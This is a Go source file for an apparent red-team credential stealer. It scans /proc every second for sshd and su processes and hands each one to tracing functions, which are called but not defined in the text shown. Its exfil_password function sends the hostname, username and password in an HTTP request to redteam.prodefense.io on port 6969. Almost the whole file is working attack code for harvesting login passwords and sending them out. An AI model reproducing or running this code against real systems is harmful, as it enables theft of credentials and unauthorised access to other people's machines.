package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

func find_pids() []int {
	var sshd_pids []int

	// Obtain the current process ID
	currentPID := os.Getpid()

	// Read the /proc directory to get a list of process directories
	procDirs, err := ioutil.ReadDir("/proc")
	if err != nil {
		fmt.Println("Error reading /proc:", err)
		return nil
	}

	// Iterate through the process directories and extract PIDs
	for _, dir := range procDirs {
		if dir.IsDir() {
			pid, err := strconv.Atoi(dir.Name())
			if err == nil && pid != currentPID {
				sshd_pids = append(sshd_pids, pid)
			}
		}
	}

	return sshd_pids
}

func is_SSH_PID(pid int) bool {
	cmdline, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil {
		return false
	}
	return regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).MatchString(strings.ReplaceAll(string(cmdline), "\x00", " "))
}

func is_SU_PID(pid int) bool {
	cmdline, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil {
		return false
	}
	return regexp.MustCompile(`su `).MatchString(strings.ReplaceAll(string(cmdline), "\x00", " "))
}

func exfil_password(username, password string) {
	hostname, err := os.Hostname()
	if err != nil {
		return
	}
	serverURL := "http://redteam.prodefense.io:6969/"
	values := url.Values{}
	values.Set("hostname", hostname)
	values.Set("username", username)
	values.Set("password", password)
	fullURL := fmt.Sprintf("%s?%s", serverURL, values.Encode())

	http.Get(fullURL)
}

func main() {
	var processedFirstPID bool
	var processed_pids []int
	var processedPIDsMutex sync.Mutex

	for {
		sshdPids := find_pids()
		for _, pid := range sshdPids {
			processedPIDsMutex.Lock()
			if is_SSH_PID(pid) && (!processedFirstPID || !contains(processed_pids, pid)) {
				if !processedFirstPID {
					processedFirstPID = true
				} else {
					fmt.Println("SSHD process found with PID:", pid)
					go traceSSHDProcess(pid)
					processed_pids = append(processed_pids, pid)
				}
			}
			if is_SU_PID(pid) && (!processedFirstPID || !contains(processed_pids, pid)) {
				if !processedFirstPID {
					processedFirstPID = true
				} else {
					fmt.Println("SU process found with PID:", pid)
					go traceSUProcess(pid)
					processed_pids = append(processed_pids, pid)
				}
			}

			processedPIDsMutex.Unlock()
		}
		time.Sleep(1 * time.Second)
	}
}

func contains(slice []int, value int) bool {
	for _, v := range slice {
		if v == value {
			return true
		}
	}
	return false
}
